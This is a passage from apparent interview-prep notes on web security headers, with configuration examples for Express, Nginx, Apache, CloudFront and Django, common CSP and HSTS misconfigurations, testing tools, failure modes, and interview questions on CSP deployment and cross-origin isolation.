});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          (req, res) => `'nonce-${res.locals.cspNonce}'`,
          "'strict-dynamic'",
        ],
        styleSrc: ["'self'", "https://fonts.googleapis.com"],
        imgSrc: ["'self'", "data:", "https://images.example.com"],
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        connectSrc: ["'self'", "https://api.example.com"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        frameAncestors: ["'none'"],
        formAction: ["'self'"],
        reportUri: ["/csp-report"],
      },
    },
    strictTransportSecurity: {
      maxAge: 63072000,
      includeSubDomains: true,
      preload: true,
    },
    referrerPolicy: {
      policy: "strict-origin-when-cross-origin",
    },
  })
);

app.use(
  helmet.permittedCrossDomainPolicies({ permittedPolicies: "none" })
);

app.get("/", (req, res) => {
  res.send(`
    <html>
      <script nonce="${res.locals.cspNonce}">
        console.log('This script is allowed by CSP');
      </script>
    </html>
  `);
});
```

#### Nginx configuration

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # HSTS
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # CSP
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'strict-dynamic' 'nonce-$request_id'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; report-uri /csp-report" always;

    # Prevent MIME sniffing
    add_header X-Content-Type-Options "nosniff" always;

    # Clickjacking protection
    add_header X-Frame-Options "DENY" always;

    # Referrer policy
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Permissions policy
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=(self), payment=(self)" always;

    # Cross-origin isolation (if needed)
    add_header Cross-Origin-Opener-Policy "same-origin" always;
    add_header Cross-Origin-Embedder-Policy "require-corp" always;
    add_header Cross-Origin-Resource-Policy "same-origin" always;
}
```

**Note the `always` keyword**: Without it, Nginx only adds headers on successful responses (2xx/3xx). With `always`, headers are added to all responses including errors (4xx/5xx). Security headers should apply to error pages too.

#### Apache configuration

```apache
<IfModule mod_headers.c>
    # HSTS
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"

    # CSP
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'"

    # Prevent MIME sniffing
    Header always set X-Content-Type-Options "nosniff"

    # Clickjacking protection
    Header always set X-Frame-Options "DENY"

    # Referrer policy
    Header always set Referrer-Policy "strict-origin-when-cross-origin"

    # Permissions policy
    Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(self)"

    # Disable X-XSS-Protection (legacy filter is harmful)
    Header always set X-XSS-Protection "0"
</IfModule>
```

#### AWS CloudFront / CDN headers

CloudFront can add security headers via **response headers policies** (preferred) or **Lambda@Edge** functions.

**Response headers policy (AWS Console / CloudFormation):**

```yaml
ResponseHeadersPolicy:
  SecurityHeadersConfig:
    ContentSecurityPolicy:
      ContentSecurityPolicy: "default-src 'self'; script-src 'self'; object-src 'none'"
      Override: true
    StrictTransportSecurity:
      AccessControlMaxAgeSec: 63072000
      IncludeSubdomains: true
      Preload: true
      Override: true
    ContentTypeOptions:
      Override: true
    FrameOptions:
      FrameOption: DENY
      Override: true
    ReferrerPolicy:
      ReferrerPolicy: strict-origin-when-cross-origin
      Override: true
    XSSProtection:
      ModeBlock: false
      Protection: false
      Override: true
```

**Lambda@Edge (for dynamic CSP with nonces):**

```javascript
exports.handler = async (event) => {
  const response = event.Records[0].cf.response;
  const nonce = generateNonce();

  response.headers["content-security-policy"] = [
    {
      key: "Content-Security-Policy",
      value: `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'self'`,
    },
  ];

  return response;
};
```

#### Django / Python

```python
# settings.py

# Django's built-in security middleware
SECURE_HSTS_SECONDS = 63072000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_BROWSER_XSS_FILTER = False  # Don't set X-XSS-Protection: 1
X_FRAME_OPTIONS = "DENY"
SECURE_REFERRER_POLICY = "strict-origin-when-cross-origin"

# For CSP, use django-csp
# pip install django-csp
MIDDLEWARE = [
    "csp.middleware.CSPMiddleware",
    # ...
]

CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'", "https://fonts.googleapis.com")
CSP_FONT_SRC = ("'self'", "https://fonts.gstatic.com")
CSP_IMG_SRC = ("'self'", "data:")
CSP_OBJECT_SRC = ("'none'",)
CSP_BASE_URI = ("'self'",)
CSP_FRAME_ANCESTORS = ("'none'",)
CSP_INCLUDE_NONCE_IN = ["script-src"]
CSP_REPORT_URI = "/csp-report/"
```

In templates:

{% raw %}
```html
{% load csp %}
<script nonce="{% csp_nonce %}">
  console.log('CSP-compliant inline script');
</script>
```
{% endraw %}

### Common Misconfigurations

#### CSP with 'unsafe-inline' defeating the purpose

```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

This CSP is **almost useless** for XSS protection. The entire point of CSP is to block inline script execution. With `'unsafe-inline'`, any injected `<script>alert(1)</script>` will execute. This is the most common CSP misconfiguration.

**Fix**: Replace `'unsafe-inline'` with nonces or hashes. Use `'strict-dynamic'` for dynamically loaded scripts.

#### HSTS without includeSubDomains

```
Strict-Transport-Security: max-age=31536000
```

Without `includeSubDomains`, an attacker can set up an HTTP connection to any subdomain (e.g., `http://anything.example.com`) to perform cookie injection or SSL stripping attacks against the parent domain.

**Fix**: Always include `includeSubDomains` after verifying all subdomains support HTTPS.

#### Missing headers on API endpoints

Many teams only set security headers on HTML pages and forget API endpoints. While some headers (CSP, X-Frame-Options) primarily protect rendered pages, others matter for APIs:

- `X-Content-Type-Options: nosniff` — prevents browsers from reinterpreting API responses.
- `Strict-Transport-Security` — should be on every response to keep the HSTS cache fresh.
- `Cache-Control` — API responses with sensitive data should not be cached by the browser.

**Fix**: Set security headers globally (at the load balancer, reverse proxy, or middleware level), not per-route.

#### Setting headers only on some routes

If your Express app sets helmet middleware only on some routes, or your Nginx config only adds headers in one `location` block, some responses will lack protection.

**Fix**: Apply security headers at the outermost layer (reverse proxy, CDN, or top-level middleware) so every response includes them.

#### Overly permissive Permissions-Policy

```
Permissions-Policy: camera=(*), microphone=(*), geolocation=(*)
```

This allows all embedded content to use sensitive APIs. Most applications don't need to grant these permissions to any third-party content.

**Fix**: Default to `()` (deny) for all features and only enable what you need:

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

### Testing and Validation

#### SecurityHeaders.com

[securityheaders.com](https://securityheaders.com) scans your site and grades your security headers from A+ to F. It checks for the presence and correct configuration of all major security headers. Useful for quick assessments and comparing against best practices.

#### Mozilla Observatory

[observatory.mozilla.org](https://observatory.mozilla.org) provides a more comprehensive scan including security headers, TLS configuration, cookies, and other best practices. Scores from 0-100 with letter grades.

#### CSP Evaluator (Google)

[csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) specifically analyzes your CSP for weaknesses. It identifies:
- Overly broad source lists
- Use of `'unsafe-inline'` or `'unsafe-eval'`
- Known JSONP bypass endpoints in whitelisted domains
- Missing critical directives (`object-src`, `base-uri`)

#### Browser DevTools

- **Network tab**: Inspect response headers on each request. Verify headers are present and correct.
- **Console**: CSP violations appear as console errors with detailed messages:
  ```
  Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'".
  ```
- **Application tab** → **Frames**: Shows the effective CSP and Permissions-Policy for the page.
- **Security tab**: Shows TLS and certificate details, HSTS status.

#### Automated scanning in CI/CD

Integrate header checks into your deployment pipeline:

```bash
# Using curl to check headers
curl -sI https://example.com | grep -i "content-security-policy\|strict-transport-security\|x-content-type-options\|x-frame-options\|referrer-policy\|permissions-policy"

# Using Mozilla's http-observatory-cli
npm install -g observatory-cli
observatory example.com

# Custom script to fail CI if headers are missing
#!/bin/bash
HEADERS=$(curl -sI https://staging.example.com)
for HEADER in "Content-Security-Policy" "Strict-Transport-Security" "X-Content-Type-Options"; do
  if ! echo "$HEADERS" | grep -qi "$HEADER"; then
    echo "MISSING: $HEADER"
    exit 1
  fi
done
echo "All required security headers present"
```

---

## How Security Headers Fail

Even correctly configured headers can fail in practice. Understanding failure modes is critical for senior/staff interviews.

### Headers not applied to all responses

Security headers are typically set on HTML page responses. But:

- **API responses** served from the same origin may lack headers. If a browser navigates directly to an API endpoint (e.g., `/api/user`), missing `X-Content-Type-Options` or `X-Frame-Options` could create vulnerabilities.
- **Error pages** (404, 500) generated by the web server or framework may bypass middleware and lack headers. Nginx's `always` keyword and Express's error-handling middleware address this.
- **Static file servers** (e.g., serving uploaded content from a separate path) may have completely different header configurations.

### CDN/proxy stripping headers

- **CDN misconfiguration**: Some CDNs strip or override response headers. CloudFront, for example, may not forward custom headers from the origin unless configured to do so.
- **Load balancers**: Adding headers at the origin doesn't help if the load balancer strips them before forwarding to the client. Test from the client's perspective, not the origin server.
- **Proxy/WAF interference**: Some WAFs add their own CSP or modify existing headers, creating conflicts or weakening the policy.

### Third-party scripts violating CSP

Third-party scripts (analytics, ads, chat widgets, A/B testing) are the biggest challenge for CSP deployment:

- They load additional scripts from domains you haven't whitelisted.
- They use `eval()` and inline scripts.
- They change their behavior and domains without notice, breaking your CSP.
- They inject iframes, images, and styles from unknown sources.

**Mitigation strategies**:
- Use `'strict-dynamic'` so nonce-trusted bootstrap scripts can load their dependencies.
- Isolate third-party scripts in sandboxed iframes where possible.
- Monitor CSP reports to detect when third-party scripts change their loading patterns.
- Negotiate with vendors to provide CSP-compatible integration methods.

### Report fatigue

A strict CSP on a large application generates **thousands of violation reports**:

- Browser extensions trigger violations (they inject scripts into every page).
- Outdated bookmarklets and browser toolbars.
- Legitimate third-party script changes.
- Users on networks with injecting proxies (hotel WiFi, corporate proxies).

The volume of noise makes it hard to identify real attacks. **Mitigations**:
- Use a dedicated CSP report aggregation service (Report URI, Sentry, Datadog).
- Filter out known browser extension patterns.
- Sample reports (only send a percentage to the reporting endpoint).
- Set `report-to` with rate limiting.

### False sense of security without server-side defenses

Security headers supplement but don't replace server-side security:

- **CSP does not prevent stored XSS from being stored.** It only prevents the browser from executing the payload. If CSP is weakened or bypassed, the stored payload fires.
- **HSTS does not fix mixed content.** If your page loads an image over HTTP, HSTS on the page won't help — you need to fix the mixed content.
- **X-Frame-Options doesn't prevent CSRF.** Clickjacking and CSRF are different attacks. You need CSRF tokens independently.
- **Headers don't protect non-browser clients.** API clients, mobile apps, and curl ignore security headers entirely. Server-side validation remains essential.

---

## Interview Clusters

### Fundamentals

- **"What is CSP and how does it prevent XSS?"** — Explain the whitelist model. CSP tells the browser which script sources to trust. Inline scripts are blocked unless explicitly allowed via nonces/hashes. Even if an attacker injects HTML, the browser refuses to execute unauthorized scripts.

- **"Why is X-XSS-Protection deprecated?"** — The browser's built-in XSS filter was unreliable (false positives), could be weaponized (information leakage, selective filtering creating new vulnerabilities), and is superseded by CSP which provides better protection. Set it to `0` to disable.

- **"What does HSTS do and why is preloading important?"** — HSTS forces the browser to use HTTPS for all future connections. Without preloading, the first visit is vulnerable to SSL stripping because the browser hasn't seen the HSTS header yet. Preloading hardcodes the domain as HTTPS-only in the browser itself.

- **"What's the difference between X-Frame-Options and CSP frame-ancestors?"** — Both prevent clickjacking. `X-Frame-Options` is older, supports only DENY, SAMEORIGIN, or a single ALLOW-FROM origin (poorly supported). `frame-ancestors` in CSP supports multiple origins, wildcards, and is the modern standard. Use both for backward compatibility.

### Senior

- **"How would you deploy CSP on a large application with many third-party scripts?"**
  1. Start with `Content-Security-Policy-Report-Only` and `report-uri` to collect violation data without breaking anything.
  2. Audit violations for 2-4 weeks. Categorize: legitimate resources, browser extensions, actual attacks.
  3. Build the policy iteratively: whitelist legitimate domains, add nonces for inline scripts, use `'strict-dynamic'` for dynamically loaded scripts.
  4. Move from report-only to enforced. Keep reporting on.
  5. Tighten over time: remove `'unsafe-inline'`, reduce domain allowlists, pressure third-party vendors for CSP-compatible integrations.
  6. Set up automated monitoring for policy changes and violation spikes.

- **"What security headers would you set for a REST API?"**
  - `Strict-Transport-Security` — enforce HTTPS.
  - `X-Content-Type-Options: nosniff` — prevent MIME sniffing of API responses.
  - `Cache-Control: no-store` — prevent caching of sensitive API responses.
  - `Content-Type: application/json` — explicit type prevents reinterpretation.
  - `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` — prevent framing API responses.
  - `Referrer-Policy: no-referrer` — API URLs may contain tokens.
  - `Permissions-Policy` — disable browser features you don't need.
  - No need for `X-XSS-Protection` (set to `0` if present).

- **"Explain CSP bypass via JSONP and how to prevent it."** — If `script-src` includes a domain that serves JSONP endpoints, an attacker can craft a script URL with an arbitrary callback containing JavaScript code. The JSONP response wraps it in a function call that executes. Prevention: use nonce-based CSP with `'strict-dynamic'` instead of domain allowlists. Never whitelist domains you don't fully control.

### Staff

- **"Design a security headers strategy for a multi-tenant SaaS with customer-controlled content."**
  
  This is a complex problem because:
  - Customer content (rich text, embedded media, custom HTML templates) needs to render but not execute arbitrary scripts.
  - Different tenants may have different integration needs (some embed YouTube, others embed custom dashboards).
  - The main application and customer content may share an origin or use separate origins.

  **Approach**:
  1. **Separate origins for user content**: Serve customer-controlled content from a different domain (e.g., `content.example-usercontent.com`) so it has a different origin from the application. This prevents XSS in user content from accessing application cookies/data.
  2. **Per-tenant CSP**: If tenants customize which third-party integrations they use, generate CSP dynamically per tenant. Store their allowed domains and generate the header on each response.
  3. **Sandboxed iframes**: Render customer content in sandboxed iframes (`sandbox="allow-scripts allow-same-origin"` with a separate origin) to isolate it from the parent application.
  4. **Strict CSP on the application itself**: The main SaaS app uses nonce-based CSP with `strict-dynamic`. Customer content uses a separate, more permissive policy on the sandboxed origin.
  5. **HSTS on all domains**: Both the application domain and the user-content domain enforce HTTPS.
  6. **Permissions-Policy**: Block camera, microphone, geolocation, etc., on the user-content domain. Only the main app gets access to sensitive APIs.
  7. **Monitoring**: Aggregate CSP reports per tenant to identify which tenants are generating violations (potential attack targets or misconfigured integrations).

- **"How do COOP, COEP, and CORP work together for cross-origin isolation, and what breaks?"**
  
  Cross-origin isolation requires:
  - `Cross-Origin-Opener-Policy: same-origin` — isolates your window from cross-origin openers.
  - `Cross-Origin-Embedder-Policy: require-corp` — only loads cross-origin resources that opt in.
  
  Every cross-origin resource your page loads must set `Cross-Origin-Resource-Policy: cross-origin` (or be served with appropriate CORS headers). This is what breaks:
  - Third-party images from CDNs that don't set CORP headers.
  - Third-party scripts, ads, and analytics that don't support CORP.
  - Embedded iframes from partners who haven't added the header.
  
  **Workaround**: `Cross-Origin-Embedder-Policy: credentialless` is a less strict alternative that loads cross-origin resources without credentials instead of blocking them, but it changes behavior for authenticated resources.

---

## Cross-links

[XSS](../XSS/XSS.md) — CSP is a primary XSS mitigation layer

[XSS vs CSRF](../XSS%20vs%20CSRF/XSS%20vs%20CSRF.md) — Headers address different aspects of each attack

[Cookie Security](../Cookie%20Security/HttpOnly%20and%20Secure%20cookies.md) — HttpOnly, Secure, SameSite complement security headers

[TLS](../TLS/TLS.md) — HSTS enforces the transport security that TLS provides

[Web Application Security Vulnerabilities](../Web%20Application%20Security%20Vulnerabilities/Web%20Application%20Security%20Vulnerabilities.md) — Security headers mitigate many categories of web vulnerabilities

[Threat Modeling](../Threat%20Modeling/Threat%20Modeling.md) — Security headers address specific threats identified during modeling
